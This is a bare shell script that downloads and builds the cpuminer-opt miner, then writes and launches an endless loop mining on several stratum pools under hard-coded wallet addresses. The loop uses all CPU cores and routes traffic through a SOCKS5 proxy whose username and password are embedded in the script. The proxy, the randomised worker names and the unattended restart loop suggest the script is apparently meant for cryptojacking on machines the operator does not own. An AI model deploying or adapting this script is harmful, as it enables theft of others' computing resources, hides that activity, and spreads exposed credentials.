proxy="socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080"
array[0]="0001"
array[1]="0002"
array[2]="0003"
size=${#array[@]}
index=$(($RANDOM % $size))
worker=${array[$index]}
git clone https://github.com/JayDDee/cpuminer-opt.git
cd cpuminer-opt
chmod +x build.sh
./build.sh && echo '#!/bin/sh
while [ 1 ]; do
./cpuminer -a yespower -o stratum+tcp://yespower.eu.mine.zpool.ca:6234 -u RA5S1Suf1BHvTiphQ3VRnWy6aShii374j5 -p c=VRSC -o stratum+tcp://murkapool.it:6253 -u CQ5axqsyHCmRvEraX88oa7obrPhHyqsNN7.bLuWex-$worker -p c=CPMK -o stratum+tcp://fpool.eu:6234 -u CQ5axqsyHCmRvEraX88oa7obrPhHyqsNN7.juNeD-$worker -p c=CPMK -t $(nproc --all) -x $proxy
sleep 5
done' > autominer.sh && chmod +x autominer.sh && ./autominer.sh
